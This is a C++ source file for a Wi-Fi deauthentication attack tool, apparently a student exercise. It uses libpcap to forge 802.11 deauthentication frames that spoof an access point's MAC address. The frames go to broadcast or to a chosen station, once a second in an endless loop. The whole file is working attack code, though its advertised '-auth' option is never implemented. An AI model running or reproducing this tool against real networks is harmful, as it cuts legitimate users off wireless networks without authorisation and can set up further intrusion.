#include "stdafx.h"
#include "dot11.h"
 
#define DEAUTHPACKET_LEN 0x26 //38byte

struct DeauthAttackPacket
{
    Dot11RadioTapHdr radiohdr_; //8bytes
    u_int8_t datarate_; //1bytes
    u_int8_t pad_; //1bytes
    u_int16_t txflags_; //2bytes
    Dot11BeaconFrame beaconhdr_; //24bytes
    u_int16_t fixedparam_; //2bytes
};

void usage() {
	printf("syntax : deauth-attack <interface> <ap mac> [<station mac>] [-auth]\n");
	printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

void dumpPacket(const u_char* packet, int len) {
    for(int i = 0;i<len;)
    {
        for(int j = 0; j<8; j++, i++)
        {
            printf("0x");
            printf("%02x ", packet[i]);
            if(i>=len)
            {
                printf("\n");
                return;
            }
        }
        std::cout << " ";
        for(int j = 0; j<8; j++, i++)
        {
            printf("0x");
            printf("%02x ", packet[i]);
            if(i>=len)
            {
                printf("\n");
                return;
            }
        }
        printf("\n");
    }
    printf("\n");
}

int main(int argc, char* argv[]) {
	if (argc < 3 || argc > 5)
    {
        usage();
        return -1;
    }

    char* interface = argv[1];
    std::cout << "selected interface: "<< interface << std::endl;

	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf); //1000
	if (handle == NULL) {
		std::cerr << "pcap_open_live(" << interface << ") return null - " << errbuf << std::endl;
		return -1;
	}

    DeauthAttackPacket pk;
    pk.radiohdr_.revision_ = 0x00;
    pk.radiohdr_.pad_ = 0x00;
    pk.radiohdr_.len_ = 0x000c;
    pk.radiohdr_.presentflag_ = 0x00008004;
    pk.datarate_ = 0x02;
    pk.pad_ = 0x00;
    pk.txflags_ = 0x0018;
    pk.beaconhdr_.framecontrol_ = 0xc0;
    pk.beaconhdr_.flags_ = 0x00;
    pk.beaconhdr_.duration_ = 0x0000;
    if(argc == 3)
        pk.beaconhdr_.addr1_ = Mac("ff:ff:ff:ff:ff:ff");
    else if(argc == 4)
        pk.beaconhdr_.addr1_ = Mac(argv[3]);
    pk.beaconhdr_.addr2_ = Mac(argv[2]);
    pk.beaconhdr_.addr3_ = Mac(argv[2]);
    pk.fixedparam_ = 0x0007;

    int res;
    u_int16_t num = 0;

	while (true) {
        pk.beaconhdr_.fragseqnum_ = num << 4;
        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pk), DEAUTHPACKET_LEN);
        printf("send seq: %d\n", num);
        num++; sleep(1);
	}
	pcap_close(handle);
}
